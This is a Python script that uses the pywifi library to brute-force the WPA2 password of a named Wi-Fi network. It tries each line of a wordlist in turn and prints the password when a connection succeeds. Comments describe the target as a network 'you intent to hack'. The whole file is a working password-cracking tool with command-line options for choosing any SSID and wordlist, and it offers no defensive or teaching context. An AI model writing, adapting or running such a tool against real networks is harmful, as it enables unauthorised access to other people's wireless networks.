import argparse

import os, sys, os.path, platform
import time


from scipy.misc import face

import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

client_ssid = 'Gone' #the wife network name of the one you intent to hack
path_to_file = "C:/Users/kuyik/Desktop/malwares/Codecamp/password.txt" #the path to the generated possible passcode

#for the color combination to produce during the hacking process
RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN ="\033[1;36m"
GREEN = "\033[1;32m"
RESET = "\033[1;0m"
BOLD = "\033[;1m"



try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan()
    results = ifaces.scan_result()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]


except:
    print("[-] error in system")


type = False

def main(ssid, password, number):


    profile = Profile() # create profile instance
    profile.ssid = ssid #client name
    profile.auth = const.AUTH_ALG_OPEN #auth algo
    profile.akm.append(const.AKM_TYPE_WPA2PSK) #key management
    profile.cipher = const.CIPHER_TYPE_CCMP 

    profile.key = password #this is to used your generated passcode which is aready in your system
    iface.remove_all_network_profile() # this line help to remove profiles of other wifi network that had ready connect to the device
    tmp_profile = iface.add_network_profile(profile) #this line helps to add the new network to the device or to automatically connect to the network
    iface.connect(tmp_profile)
    time.sleep(0.5)


    if ifaces.status() == const.IFACE_CONNECTED:
        print(ifaces.status(),const.IFACE_CONNECTED)
        time.sleep(1)
        print(BOLD, GREEN, '[*] crack success!', RESET)
        print(BOLD, GREEN, '[*] password of the file is ' +password, RESET)
        time.sleep(1)
        exit()

    else:
        print(RED, 'crack fails using '.format(number, password))
        print(RED, '[{}] crack failed using {}\n'.format(number, password))


def pwd(ssid, file):
    number = 0 
    with open(file, 'r', encoding='utf8' ) as word:
        for line in word:
            number += 1
            lines = line.split("\n")
            pwd = lines[0]
            main(ssid, pwd, number)

def menu(client_ssid,path_to_file):
    perser = argparse.ArgumentParser(description='argparse Example')

    #adding arguments
    perser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID + WIFI name......')
    perser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ....')

    print()

    args = perser.parse_args()

    print(CYAN, "[+] you are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2)

    if args.wordlist and args.ssid:
        ssid =args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file
    

    if os.path.exists(filee):
        if platform.system().startswith('win' or 'Win'):
            os.system('cls')
        else:
            os.system('clear')
        
        
        print(BLUE, "[~] cracking..............")
        pwd(ssid, filee)
    else:
        print(RED, "[-] no such file.", BLUE)

menu(client_ssid , path_to_file)

